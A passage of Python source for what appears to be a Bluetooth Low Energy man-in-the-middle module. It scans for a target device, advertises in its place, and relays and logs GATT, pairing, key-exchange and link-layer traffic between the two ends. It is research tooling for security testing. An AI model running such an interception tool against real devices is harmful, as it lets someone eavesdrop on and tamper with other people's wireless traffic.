    def masterReadByType(self, packet):
        io.info(
            "Read By Type Request (from master) : startHandle = "
            + hex(packet.startHandle)
            + " / endHandle = "
            + hex(packet.endHandle)
            + " / uuid = "
            + hex(packet.uuid)
        )

        self.forwardToSlave(
            ble.BLEReadByTypeRequest(
                startHandle=packet.startHandle,
                endHandle=packet.endHandle,
                uuid=packet.uuid,
            )
        )

    @module.scenarioSignal("onSlaveReadByTypeRequest")
    def slaveReadByType(self, packet):
        io.info(
            "Read By Type Request (from slave) : startHandle = "
            + hex(packet.startHandle)
            + " / endHandle = "
            + hex(packet.endHandle)
            + " / uuid = "
            + hex(packet.uuid)
        )

        self.forwardToMaster(
            ble.BLEReadByTypeRequest(
                startHandle=packet.startHandle,
                endHandle=packet.endHandle,
                uuid=packet.uuid,
            )
        )

        # TODOD: Why
        # self.a2sEmitter.sendp(
        #     ble.BLEErrorResponse(handle=0x0001,ecode=0x0a,request=0x08)
        #     )

    @module.scenarioSignal("onMasterReadByGroupTypeRequest")
    def readByGroupType(self, packet):
        io.info(
            "Read By Group Type Request (from master) : startHandle = "
            + hex(packet.startHandle)
            + " / endHandle = "
            + hex(packet.endHandle)
            + " / uuid = "
            + hex(packet.uuid)
        )

        self.forwardToSlave(
            ble.BLEReadByGroupTypeRequest(
                startHandle=packet.startHandle,
                endHandle=packet.endHandle,
                uuid=packet.uuid,
            )
        )

    @module.scenarioSignal("onSlaveReadByTypeResponse")
    def readByTypeResponse(self, packet):
        io.info("Read By Type Response (from slave) : data = " + packet.data.hex())
        self.forwardToMaster(ble.BLEReadByTypeResponse(data=packet.data))

    @module.scenarioSignal("onSlaveReadByGroupTypeResponse")
    def readByGroupTypeResponse(self, packet):
        io.info(
            "Read By Group Type Response (from slave) : length = "
            + str(packet.length)
            + " / data = "
            + packet.data.hex()
        )
        self.forwardToMaster(
            ble.BLEReadByGroupTypeResponse(length=packet.length, data=packet.data)
        )

    @module.scenarioSignal("onSlaveConnectionParameterUpdateRequest")
    def slaveConnectionParameterUpdateRequest(self, packet):
        io.info(
            "Connection Parameter Update Request (from slave) : slaveLatency = "
            + str(packet.slaveLatency)
            + " / timeoutMult = "
            + str(packet.timeoutMult)
            + " / minInterval = "
            + str(packet.minInterval)
            + " / maxInterval = "
            + str(packet.maxInterval)
        )

        self.maxInterval = packet.maxInterval
        self.minInterval = packet.minInterval
        self.timeoutMult = packet.timeoutMult
        self.slaveLatency = packet.slaveLatency
        self.minCe = 0
        self.maxCe = 0
        if self.getStage() != BLEMitmStage.ACTIVE_MITM:
            io.info("Sending a response to slave ...")
            self.a2sEmitter.sendp(
                ble.BLEConnectionParameterUpdateResponse(
                    l2capCmdId=packet.l2capCmdId, moveResult=0
                )
            )
            self.a2sEmitter.updateConnectionParameters(
                timeout=packet.timeoutMult,
                latency=packet.slaveLatency,
                minInterval=packet.minInterval,
                maxInterval=packet.maxInterval,
                minCe=0,
                maxCe=0,
            )
        else:
            io.info("Redirecting to master ...")
            self.a2mEmitter.sendp(
                ble.BLEConnectionParameterUpdateRequest(
                    l2capCmdId=packet.l2capCmdId,
                    timeoutMult=packet.timeoutMult,
                    slaveLatency=packet.slaveLatency,
                    minInterval=packet.minInterval,
                    maxInterval=packet.maxInterval,
                )
            )

    @module.scenarioSignal("onMasterConnectionParameterUpdateResponse")
    def masterConnectionParameterUpdateResponse(self, packet):
        io.info(
            "Connection Parameter Update Response (from master) : moveResult = "
            + str(packet.moveResult)
        )

        io.info("Redirecting to slave ...")
        self.a2sEmitter.sendp(
            ble.BLEConnectionParameterUpdateResponse(
                l2capCmdId=packet.l2capCmdId, moveResult=packet.moveResult
            )
        )
        if packet.moveResult == 0 and self.a2sEmitter.isConnected():
            io.info(
                "Updating Connection Parameter: slaveLatency = "
                + str(self.slaveLatency)
                + " / timeoutMult = "
                + str(self.timeoutMult)
                + " / minInterval = "
                + str(self.minInterval)
                + " / maxInterval = "
                + str(self.maxInterval)
            )
            self.a2sEmitter.updateConnectionParameters(
                timeout=self.timeoutMult,
                latency=self.slaveLatency,
                minInterval=self.minInterval,
                maxInterval=self.maxInterval,
            )

    # Link Layer Callbacks

    @module.scenarioSignal("onSlaveLLConnUpdateInd")
    def slaveLLConnUpdateInd(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLConnUpdateInd")
    def masterLLConnUpdateInd(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLChannelMapInd")
    def slaveLLChannelMapInd(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLChannelMapInd")
    def masterLLChannelMapInd(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLTerminateInd")
    def slaveLLTerminateInd(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLTerminateInd")
    def masterLLTerminateInd(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onMasterLLEncReq")
    def masterLLEncReq(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLEncReq")
    def slaveLLEncReq(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLEncRsp")
    def masterLLEncRsp(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLEncRsp")
    def slaveLLEncRsp(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLStartEncReq")
    def masterLLStartEncReq(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLStartEncReq")
    def slaveLLStartEncReq(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLStartEncRsp")
    def masterLLStartEncRsp(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLStartEncRsp")
    def slaveLLStartEncRsp(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onSlaveLLUnknownRsp")
    def slaveLLUnknownRsp(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLUnknownRsp")
    def masterLLUnknownRsp(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLFeatureReq")
    def slaveLLFeatureReq(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLFeatureReq")
    def masterLLFeatureReq(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLFeatureRsp")
    def slaveLLFeatureRsp(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLFeatureRsp")
    def masterLLFeatureRsp(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onMasterLLPauseEncReq")
    def masterLLPauseEncReq(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLPauseEncReq")
    def slaveLLPauseEncReq(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLPauseEncRsp")
    def masterLLPauseEncRsp(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLPauseEncRsp")
    def slaveLLPauseEncRsp(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onSlaveLLVersionInd")
    def slaveLLVersionInd(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLVersionInd")
    def masterLLVersionInd(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLRejectInd")
    def slaveLLRejectInd(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLRejectInd")
    def masterLLRejectInd(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onMasterLLSlaveFeatureReq")
    def masterLLSlaveFeatureReq(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLSlaveFeatureReq")
    def slaveLLSlaveFeatureReq(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onSlaveLLConnParamReq")
    def slaveLLConnParamReq(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLConnParamReq")
    def masterLLConnParamReq(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLConnParamRsp")
    def slaveLLConnParamRsp(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLConnParamRsp")
    def masterLLConnParamRsp(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLRejectExtInd")
    def slaveLLRejectExtInd(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLRejectExtInd")
    def masterLLRejectExtInd(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLPingReq")
    def slaveLLPingReq(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLPingReq")
    def masterLLPingReq(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLPingRsp")
    def slaveLLPingRsp(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLPingRsp")
    def masterLLPingRsp(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLLengthReq")
    def slaveLLLengthReq(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLLengthReq")
    def masterLLLengthReq(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLLengthRsp")
    def slaveLLLengthRsp(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLLengthRsp")
    def masterLLLengthRsp(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLPhyReq")
    def slaveLLPhyReq(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLPhyReq")
    def masterLLPhyReq(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLPhyRsp")
    def slaveLLPhyRsp(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLPhyRsp")
    def masterLLPhyRsp(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLPhyUpdateInd")
    def slaveLLPhyUpdateInd(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLPhyUpdateInd")
    def masterLLPhyUpdateInd(self, packet):
        io.info("Master: " + packet.toString())

    @module.scenarioSignal("onSlaveLLMinUsedChannelsInd")
    def slaveLLMinUsedChannelsInd(self, packet):
        io.info("Slave: " + packet.toString())

    @module.scenarioSignal("onMasterLLMinUsedChannelsInd")
    def masterLLMinUsedChannelsInd(self, packet):
        io.info("Master: " + packet.toString())

    # TODO: Callbacks, which are by the time of writing not supported by Dongle
    # @module.scenarioSignal("onSlaveLLCTEReq")
    # def slaveLLCTEReq(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLCTEReq")
    # def masterLLCTEReq(self, packet):
    #     io.info("Master: " + packet.toString())

    # @module.scenarioSignal("onSlaveLLCTERsp")
    # def slaveLLCTERsp(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLCTERsp")
    # def masterLLCTERsp(self, packet):
    #     io.info("Master: " + packet.toString())

    # # @module.scenarioSignal("onSlaveLLPeriodicSyncInd")
    # def slaveLLPeriodicSyncInd(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLPeriodicSyncInd")
    # def masterLLPeriodicSyncInd(self, packet):
    #     io.info("Master: " + packet.toString())

    # @module.scenarioSignal("onSlaveLLClockAccuracyReq")
    # def slaveLLClockAccuracyReq(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLClockAccuracyReq")
    # def masterLLClockAccuracyReq(self, packet):
    #     io.info("Master: " + packet.toString())

    # @module.scenarioSignal("onSlaveLLClockAccuracyRsp")
    # def slaveLLClockAccuracyRsp(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLClockAccuracyRsp")
    # def masterLLClockAccuracyRsp(self, packet):
    #     io.info("Master: " + packet.toString())

    # @module.scenarioSignal("onSlaveLLCISReq")
    # def slaveLLCISReq(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLCISReq")
    # def masterLLCISReq(self, packet):
    #     io.info("Master: " + packet.toString())

    # @module.scenarioSignal("onSlaveLLCISRsp")
    # def slaveLLCISRsp(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLCISRsp")
    # def masterLLCISRsp(self, packet):
    #     io.info("Master: " + packet.toString())

    # @module.scenarioSignal("onSlaveLLCISInd")
    # def slaveLLCISInd(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLCISInd")
    # def masterLLCISInd(self, packet):
    #     io.info("Master: " + packet.toString())

    # @module.scenarioSignal("onSlaveLLCISTerminateInd")
    # def slaveLLCISTerminateInd(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLCISTerminateInd")
    # def masterLLCISTerminateInd(self, packet):
    #     io.info("Master: " + packet.toString())

    # @module.scenarioSignal("onSlaveLLPowerControlReq")
    # def slaveLLPowerControlReq(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLPowerControlReq")
    # def masterLLPowerControlReq(self, packet):
    #     io.info("Master: " + packet.toString())

    # @module.scenarioSignal("onSlaveLLPowerControlRsp")
    # def slaveLLPowerControlRsp(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLPowerControlRsp")
    # def masterLLPowerControlRsp(self, packet):
    #     io.info("Master: " + packet.toString())

    # @module.scenarioSignal("onSlaveLLChangeInd")
    # def slaveLLChangeInd(self, packet):
    #     io.info("Slave: " + packet.toString())

    # @module.scenarioSignal("onMasterLLChangeInd")
    # def masterLLChangeInd(self, packet):
    #     io.info("Master: " + packet.toString())

    def registerEvents(self):

        # Connect Callbacks
        self.a2mReceiver.onEvent("BLEConnectResponse", callback=self.connect)

        # Disconnect Callbacks
        self.a2mReceiver.onEvent("BLEDisconnect", callback=self.disconnectMaster)
        self.a2sReceiver.onEvent("BLEDisconnect", callback=self.disconnectSlave)

        # Error Callback
        self.a2sReceiver.onEvent("BLEErrorResponse", callback=self.slaveErrorResponse)
        self.a2mReceiver.onEvent("BLEErrorResponse", callback=self.masterErrorResponse)

        # Write Callbacks
        self.a2mReceiver.onEvent("BLEWriteCommand", callback=self.writeCommand)
        self.a2mReceiver.onEvent("BLEWriteRequest", callback=self.writeRequest)
        self.a2sReceiver.onEvent("BLEWriteResponse", callback=self.writeResponse)

        # Read Callbacks
        self.a2mReceiver.onEvent("BLEReadRequest", callback=self.read)
        self.a2sReceiver.onEvent("BLEReadResponse", callback=self.readResponse)
        self.a2mReceiver.onEvent("BLEReadBlobRequest", callback=self.readBlob)
        self.a2sReceiver.onEvent("BLEReadBlobResponse", callback=self.readBlobResponse)

        # Notification Callback
        self.a2sReceiver.onEvent(
            "BLEHandleValueNotification", callback=self.notification
        )
        self.a2sReceiver.onEvent("BLEHandleValueIndication", callback=self.indication)
        self.a2mReceiver.onEvent(
            "BLEHandleValueConfirmation", callback=self.confirmation
        )

        # Find Information Callbacks
        self.a2mReceiver.onEvent(
            "BLEFindInformationRequest", callback=self.findInformation
        )
        self.a2sReceiver.onEvent(
            "BLEFindInformationResponse", callback=self.findInformationResponse
        )

        # Find Type Value Callbacks
        self.a2mReceiver.onEvent(
            "BLEFindByTypeValueRequest", callback=self.findByTypeValueRequest
        )
        self.a2sReceiver.onEvent(
            "BLEFindByTypeValueResponse", callback=self.findByTypeValueResponse
        )

        # Read By Callbacks
        self.a2mReceiver.onEvent("BLEReadByTypeRequest", callback=self.masterReadByType)
        self.a2sReceiver.onEvent("BLEReadByTypeRequest", callback=self.slaveReadByType)

        self.a2mReceiver.onEvent(
            "BLEReadByGroupTypeRequest", callback=self.readByGroupType
        )
        self.a2sReceiver.onEvent(
            "BLEReadByTypeResponse", callback=self.readByTypeResponse
        )
        self.a2sReceiver.onEvent(
            "BLEReadByGroupTypeResponse", callback=self.readByGroupTypeResponse
        )

        # MTU Callbacks
        self.a2mReceiver.onEvent(
            "BLEExchangeMTURequest", callback=self.exchangeMtuRequest
        )
        self.a2sReceiver.onEvent(
            "BLEExchangeMTUResponse", callback=self.exchangeMtuResponse
        )

        # Connection Parameter Update Callbacks
        self.a2mReceiver.onEvent(
            "BLEConnectionParameterUpdateResponse",
            callback=self.masterConnectionParameterUpdateResponse,
        )

        self.a2sReceiver.onEvent(
            "BLEConnectionParameterUpdateRequest",
            callback=self.slaveConnectionParameterUpdateRequest,
        )

        # Security Manager Callbacks
        self.a2mReceiver.onEvent(
            "BLELongTermKeyRequest", callback=self.longTermKeyRequest
        )

        self.a2mReceiver.onEvent(
            "BLEEncryptionChange", callback=self.masterEncryptionChange
        )
        self.a2sReceiver.onEvent(
            "BLEEncryptionChange", callback=self.slaveEncryptionChange
        )

        self.a2mReceiver.onEvent("BLEPairingRequest", callback=self.pairingRequest)
        self.a2sReceiver.onEvent("BLEPairingResponse", callback=self.pairingResponse)
        self.a2sReceiver.onEvent("BLESecurityRequest", callback=self.securityRequest)

        self.a2sReceiver.onEvent("BLEPairingConfirm", callback=self.slavePairingConfirm)
        self.a2mReceiver.onEvent("BLEPairingRandom", callback=self.masterPairingRandom)
        self.a2sReceiver.onEvent("BLEPairingRandom", callback=self.slavePairingRandom)
        self.a2sReceiver.onEvent("BLEPairingFailed", callback=self.slavePairingFailed)
        self.a2mReceiver.onEvent("BLEPairingFailed", callback=self.masterPairingFailed)

        self.a2sReceiver.onEvent(
            "BLEIdentityInformation", callback=self.slaveIdentityInformation
        )
        self.a2sReceiver.onEvent(
            "BLEIdentityAddressInformation",
            callback=self.slaveIdentityAddressInformation,
        )
        self.a2sReceiver.onEvent(
            "BLESigningInformation", callback=self.slaveSigningInformation
        )

        self.a2mReceiver.onEvent(
            "BLEIdentityInformation", callback=self.masterIdentityInformation
        )
        self.a2mReceiver.onEvent(
            "BLEIdentityAddressInformation",
            callback=self.masterIdentityAddressInformation,
        )
        self.a2mReceiver.onEvent(
            "BLESigningInformation", callback=self.masterSigningInformation
        )

        self.a2sReceiver.onEvent("BLEPublicKey", callback=self.slavePublicKey)
        self.a2mReceiver.onEvent("BLEPublicKey", callback=self.masterPublicKey)

        self.a2sReceiver.onEvent("BLEDHKeyCheck", callback=self.slaveDHKeyCheck)
        self.a2mReceiver.onEvent("BLEDHKeyCheck", callback=self.masterDHKeyCheck)

    def registerLLEvents(self):

        # LL Callbacks
        self.a2sReceiver.onEvent(
            "BLELLConnUpdateInd", callback=self.slaveLLConnUpdateInd
        )
        self.a2mReceiver.onEvent(
            "BLELLConnUpdateInd", callback=self.masterLLConnUpdateInd
        )
        self.a2sReceiver.onEvent("BLELLChanMapInd", callback=self.slaveLLChannelMapInd)
        self.a2mReceiver.onEvent("BLELLChanMapInd", callback=self.masterLLChannelMapInd)
        self.a2sReceiver.onEvent("BLELLTerminateInd", callback=self.slaveLLTerminateInd)
        self.a2mReceiver.onEvent(
            "BLELLTerminateInd", callback=self.masterLLTerminateInd
        )

        self.a2mReceiver.onEvent("BLELLEncReq", callback=self.masterLLEncReq)
        self.a2sReceiver.onEvent("BLELLEncReq", callback=self.slaveLLEncReq)

        self.a2sReceiver.onEvent("BLELLEncRsp", callback=self.slaveLLEncRsp)
        self.a2mReceiver.onEvent("BLELLEncRsp", callback=self.masterLLEncRsp)

        self.a2sReceiver.onEvent("BLELLStartEncReq", callback=self.slaveLLStartEncReq)
        self.a2mReceiver.onEvent("BLELLStartEncReq", callback=self.masterLLStartEncReq)

        self.a2sReceiver.onEvent("BLELLStartEncRsp", callback=self.slaveLLStartEncRsp)
        self.a2mReceiver.onEvent("BLELLStartEncRsp", callback=self.masterLLStartEncRsp)

        self.a2sReceiver.onEvent("BLELLUnknownRsp", callback=self.slaveLLUnknownRsp)
        self.a2mReceiver.onEvent("BLELLUnknownRsp", callback=self.masterLLUnknownRsp)

        self.a2sReceiver.onEvent("BLELLFeatureReq", callback=self.slaveLLFeatureReq)
        self.a2mReceiver.onEvent("BLELLFeatureReq", callback=self.masterLLFeatureReq)

        self.a2sReceiver.onEvent("BLELLFeatureRsp", callback=self.slaveLLFeatureRsp)
        self.a2mReceiver.onEvent("BLELLFeatureRsp", callback=self.masterLLFeatureRsp)

        self.a2mReceiver.onEvent("BLELLPauseEncReq", callback=self.masterLLPauseEncReq)
        self.a2sReceiver.onEvent("BLELLPauseEncReq", callback=self.slaveLLPauseEncReq)

        self.a2sReceiver.onEvent("BLELLPauseEncRsp", callback=self.slaveLLPauseEncRsp)
        self.a2mReceiver.onEvent("BLELLPauseEncRsp", callback=self.masterLLPauseEncRsp)

        self.a2sReceiver.onEvent("BLELLVersionInd", callback=self.slaveLLVersionInd)
        self.a2mReceiver.onEvent("BLELLVersionInd", callback=self.masterLLVersionInd)

        self.a2sReceiver.onEvent("BLELLRejectInd", callback=self.slaveLLRejectInd)
        self.a2mReceiver.onEvent("BLELLRejectInd", callback=self.masterLLRejectInd)

        self.a2sReceiver.onEvent(
            "BLELLSlaveFeatureReq", callback=self.slaveLLSlaveFeatureReq
        )
        self.a2mReceiver.onEvent(
            "BLELLSlaveFeatureReq", callback=self.masterLLSlaveFeatureReq
        )

        self.a2sReceiver.onEvent("BLELLConnParamReq", callback=self.slaveLLConnParamReq)
        self.a2mReceiver.onEvent(
            "BLELLConnParamReq", callback=self.masterLLConnParamReq
        )
        self.a2sReceiver.onEvent("BLELLConnParamRsp", callback=self.slaveLLConnParamRsp)
        self.a2mReceiver.onEvent(
            "BLELLConnParamRsp", callback=self.masterLLConnParamRsp
        )

        self.a2sReceiver.onEvent("BLELLRejectExtInd", callback=self.slaveLLRejectExtInd)
        self.a2mReceiver.onEvent(
            "BLELLRejectExtInd", callback=self.masterLLRejectExtInd
        )

        self.a2sReceiver.onEvent("BLELLPingReq", callback=self.slaveLLPingReq)
        self.a2mReceiver.onEvent("BLELLPingReq", callback=self.masterLLPingReq)

        self.a2sReceiver.onEvent("BLELLPingRsp", callback=self.slaveLLPingRsp)
        self.a2mReceiver.onEvent("BLELLPingRsp", callback=self.masterLLPingRsp)

        self.a2sReceiver.onEvent("BLELLDataLenReq", callback=self.slaveLLLengthReq)
        self.a2mReceiver.onEvent("BLELLDataLenReq", callback=self.masterLLLengthReq)

        self.a2sReceiver.onEvent("BLELLDataLenRsp", callback=self.slaveLLLengthRsp)
        self.a2mReceiver.onEvent("BLELLDataLenRsp", callback=self.masterLLLengthRsp)

        self.a2sReceiver.onEvent("BLELLPhyReq", callback=self.slaveLLPhyReq)
        self.a2mReceiver.onEvent("BLELLPhyReq", callback=self.masterLLPhyReq)

        self.a2sReceiver.onEvent("BLELLPhyRsp", callback=self.slaveLLPhyRsp)
        self.a2mReceiver.onEvent("BLELLPhyRsp", callback=self.masterLLPhyRsp)

        self.a2sReceiver.onEvent("BLELLUpdPHYInd", callback=self.slaveLLPhyUpdateInd)
        self.a2mReceiver.onEvent("BLELLUpdPHYInd", callback=self.masterLLPhyUpdateInd)

        self.a2sReceiver.onEvent(
            "BLELLMinUsedChann", callback=self.slaveLLMinUsedChannelsInd
        )
        self.a2mReceiver.onEvent(
            "BLELLMinUsedChann", callback=self.masterLLMinUsedChannelsInd
        )

        # TODO: Callbacks, which are by the time of writing not supported by Dongle
        # self.a2sReceiver.onEvent("BLELLCTEReq", callback=self.slaveLLCTEReq)
        # self.a2mReceiver.onEvent("BLELLCTEReq", callback=self.masterLLCTEReq)

        # self.a2sReceiver.onEvent("BLELLCTERsp", callback=self.slaveLLCTERsp)
        # self.a2mReceiver.onEvent("BLELLCTERsp", callback=self.masterLLCTERsp)

        # self.a2sReceiver.onEvent("BLELLPeriodicSyncInd", callback=self.slaveLLPeriodicSyncInd)
        # self.a2mReceiver.onEvent("BLELLPeriodicSyncInd", callback=self.masterLLPeriodicSyncInd)

        # self.a2sReceiver.onEvent("BLELLClockAccuracyReq", callback=self.slaveLLClockAccuracyReq)
        # self.a2mReceiver.onEvent("BLELLClockAccuracyReq", callback=self.masterLLClockAccuracyReq)

        # self.a2sReceiver.onEvent("BLELLClockAccuracyRsp", callback=self.slaveLLClockAccuracyRsp)
        # self.a2mReceiver.onEvent("BLELLClockAccuracyRsp", callback=self.masterLLClockAccuracyRsp)

        # self.a2sReceiver.onEvent("BLELLCISReq", callback=self.slaveLLCISReq)
        # self.a2mReceiver.onEvent("BLELLCISReq", callback=self.masterLLCISReq)

        # self.a2sReceiver.onEvent("BLELLCISRsp", callback=self.slaveLLCISRsp)
        # self.a2mReceiver.onEvent("BLELLCISRsp", callback=self.masterLLCISRsp)

        # self.a2sReceiver.onEvent("BLELLCISInd", callback=self.slaveLLCISInd)
        # self.a2mReceiver.onEvent("BLELLCISInd", callback=self.masterLLCISInd)

        # self.a2sReceiver.onEvent("BLELLCISTerminateInd", callback=self.slaveLLCISTerminateInd)
        # self.a2mReceiver.onEvent("BLELLCISTerminateInd", callback=self.masterLLCISTerminateInd)

        # self.a2sReceiver.onEvent("BLELLPowerControlReq", callback=self.slaveLLPowerControlReq)
        # self.a2mReceiver.onEvent("BLELLPowerControlReq", callback=self.masterLLPowerControlReq)

        # self.a2sReceiver.onEvent("BLELLPowerControlRsp", callback=self.slaveLLPowerControlRsp)
        # self.a2mReceiver.onEvent("BLELLPowerControlRsp", callback=self.masterLLPowerControlRsp)

        # self.a2sReceiver.onEvent("BLELLChangeInd", callback=self.slaveLLChangeInd)
        # self.a2mReceiver.onEvent("BLELLChangeInd", callback=self.masterLLChangeInd)

    def checkParametersValidity(self):
        if self.args["ADVERTISING_STRATEGY"] not in ("preconnect", "flood"):
            io.fail("You have to select a valid strategy : 'flood' or 'preconnect'")
            return self.nok()
        return None

    def run(self):
        validity = self.checkParametersValidity()
        if validity is not None:
            return validity

        self.initEmittersAndReceivers()

        self.a2mReceiver.storeCallbacks()
        self.a2sReceiver.storeCallbacks()

        if self.checkCapabilities():
            if self.loadScenario():
                io.info("Scenario loaded !")
                self.startScenario()

            self.slaveLocalAddress = self.a2sEmitter.getAddress()
            self.slaveLocalAddressType = (
                0 if self.a2sEmitter.getAddressMode() == "public" else 1
            )

            # Advertising Callbacks
            self.a2sReceiver.onEvent("BLEAdvertisement", callback=self.scanStage)

            io.success("Entering SCAN stage ...")
            self.setStage(BLEMitmStage.SCAN)

            self.a2sReceiver.setScan(enable=True)

            self.waitUntilStage(BLEMitmStage.CLONE)

            self.a2sReceiver.setScan(enable=False)

            self.a2sReceiver.removeCallbacks()

            self.registerLLEvents()
            self.registerEvents()

            if self.args["ADVERTISING_STRATEGY"] == "preconnect":
                self.connectOnSlave()

            self.a2mEmitter.setAdvertising(enable=True)
            io.success("Started Advertising. Entering WAIT_CONNECTION stage ...")
            self.setStage(BLEMitmStage.WAIT_CONNECTION)

            self.waitUntilStage(BLEMitmStage.STOP)

            self.a2mReceiver.restoreCallbacks()
            self.a2sReceiver.restoreCallbacks()
            # Clean up connections
            if self.a2mEmitter.isConnected():
                self.a2mEmitter.sendp(ble.BLEDisconnect())
            while self.a2mEmitter.isConnected():
                utils.wait(seconds=0.01)
            if self.a2sEmitter.isConnected():
                self.a2sEmitter.sendp(ble.BLEDisconnect())
            while self.a2sEmitter.isConnected():
                utils.wait(seconds=0.01)

            moduleResult = {}
            if self.scenarioEnabled:
                scenarioResult = self.endScenario({})
                moduleResult["scenarioResult"] = scenarioResult
            io.success("Result: {}".format(moduleResult))
            # Reset public address
            self.a2mEmitter.setAddress("00:00:00:00:00", random=False)
            self.a2sEmitter.setAddress("00:00:00:00:00", random=False)
            return self.ok(moduleResult)
        else:
            io.fail(
                "Interfaces provided ("
                + str(self.args["INTERFACE"])
                + ") are not able to run this module."
            )
            return self.nok()
